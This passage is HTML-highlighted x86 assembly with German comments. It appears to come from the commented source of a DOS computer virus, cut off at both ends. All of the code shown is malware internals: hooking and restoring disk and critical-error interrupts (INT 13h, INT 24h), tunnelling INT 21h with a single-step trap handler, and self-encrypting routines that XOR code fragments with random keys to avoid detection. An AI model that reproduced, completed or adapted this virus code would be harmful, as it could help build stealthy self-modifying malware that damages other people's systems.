                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================================( RÅckkehr aus INT 13h )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0488D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">89</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">                  </span><span class="sc1">; RE-SET INT 13</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
 
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">                  </span><span class="sc1">; GET INT 24</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D243D</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0444D</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D243D</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">                  </span><span class="sc1">; SET INT 24</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">],</span><span class="sc2">0070h</span><span class="sc0"> </span><span class="sc1">; Segment INT 01</span><span class="sc0">
                                                  </span><span class="sc1">; auf 70h setzen</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">89</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===========================================( Reset INT 13+INT 24 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J048CD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">90</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@Int_13h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Alte Adresse INT 13</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">              </span><span class="sc1">; SET INT 13</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D243D</span><span class="sc4">]</span><span class="sc1">; Alte Adresse INT 24</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">              </span><span class="sc1">; SET INT 24</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">90</span><span class="sc0">
                </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;=========================================================( trash )===</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================================( TRACE INT 21H )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J048F3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">91</span><span class="sc0">
                </span><span class="sc1">;----------------------( die Zahl 0401 bedeutet : )---</span><span class="sc0">
                </span><span class="sc1">;----------------------( 4 Ebenen, 1. Åbergehen   )---</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2450</span><span class="sc4">],</span><span class="sc2">0401h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_01</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                   </span><span class="sc1">; Set TF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">91</span><span class="sc0">
                </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Low_INT_21H</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; JMP INT 21h</span><span class="sc0">
                </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0491A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; alias "210A" ! ; Klein, aber fein :-)</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================(         DIE DECODE-ROUTINE           )===</span><span class="sc0">
</span><span class="sc1">;==========================( Dekodiert jedes Wal-HÑhrchen separat )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0491B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D258E</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2560</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2562</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2564</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc5">J0492F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">0edh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">

</span><span class="sc9">COMMENT</span><span class="sc0"> #       </span><span class="sc5">ERGIBT</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;-------------------------------------------</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; POP RETURNADRESSE</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; GET WORD</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; INC Returnadresse,2</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; auf den Stack damit</span><span class="sc0">
                </span><span class="sc1">;-----------------------; AL ist ZÑhler</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; AH ist XOR-byte</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
</span><span class="sc5">J00120</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J00120</span><span class="sc0">
                </span><span class="sc1">;-------------------------------------------</span><span class="sc0">
 #
</span><span class="sc5">J04941</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2560</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2562</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2564</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D258E</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================( kodiert das separate Teil )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">VersteckeCodeWieder</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">J04958</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Hole Zufallszahl &lt;&gt; 0</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04958</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; Hole Adresse des Aufrufers</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02ACC</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02AA8</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; 24h Byte zurÅckgehen</span><span class="sc0">
</span><span class="sc5">J04965</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04965</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0496E</span><span class="sc0">
</span><span class="sc5">J0496E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">SpielByte</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J0496E</span><span class="sc0">
                                        </span><span class="sc1">; Adresse "Spielbyte" holen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; und den Dekodierer impfen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================================( dekodiert den Relokator )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">DecodeFollowingCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; AX sichern</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02ACC</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02AA8</span><span class="sc0">
</span><span class="sc5">J0497F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; &lt;== "Spielbyte"</span><span class="sc0">
</span><span class="sc5">Spielbyte</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J04984</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J0497F</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
</span><span class="sc5">J04987</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; CALL NIRWANA ! siehe unten !</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">                    </span><span class="sc1">; AX zurueck</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================================( Kodiert jede 'schuppe' )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">CodeIT</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D258E</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2560</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2562</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2564</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------( aus )-----------------</span><span class="sc0">
</span><span class="sc5">J0499D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">0E3H</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------( wird )----------------</span><span class="sc0">
        </span><span class="sc1">;J0499D:        POP     BX                   ; POP returnadresse</span><span class="sc0">
        </span><span class="sc1">;               MOV     CL,Byte Ptr CS:[BX]  ; Get Byte in CL</span><span class="sc0">
        </span><span class="sc1">;               XOR     CH,CH</span><span class="sc0">
        </span><span class="sc1">;               INC     BX                   ; Return eins weiter</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; AX ist Byte + 1</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; BX ist Returnadresse-AX</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------( aus )-----------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------( wird )----------------</span><span class="sc0">
        </span><span class="sc1">;J049AC:        IN      AL,40h</span><span class="sc0">
        </span><span class="sc1">;               OR      AL,AL</span><span class="sc0">
        </span><span class="sc1">;               JZ      J049AC  ; hole Zufallszahl &lt;&gt; 0</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------( aus )-----------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">03bh</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------( wird )----------------</span><span class="sc0">
        </span><span class="sc1">;               MOV     CS:[BX],AL</span><span class="sc0">
        </span><span class="sc1">;J001A0:        INC     BX</span><span class="sc0">
        </span><span class="sc1">;               XOR     CS:[BX],AL</span><span class="sc0">
        </span><span class="sc1">;               LOOP    J001A0</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J049C0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CLI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2560</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2562</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2564</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D258E</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( Der Tracer )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Int_01_Entry</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">0C000h</span><span class="sc0">  </span><span class="sc1">; Callers Segment</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J049ED</span><span class="sc0">                    </span><span class="sc1">; hîher als C000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2447</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; oder tiefer</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; als D2447</span><span class="sc0">
                </span><span class="sc6">JBE</span><span class="sc0">     </span><span class="sc5">J049ED</span><span class="sc0">
</span><span class="sc5">J049EA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J049ED</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2450</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; Erster</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04A1B</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Callers CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Callers IP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
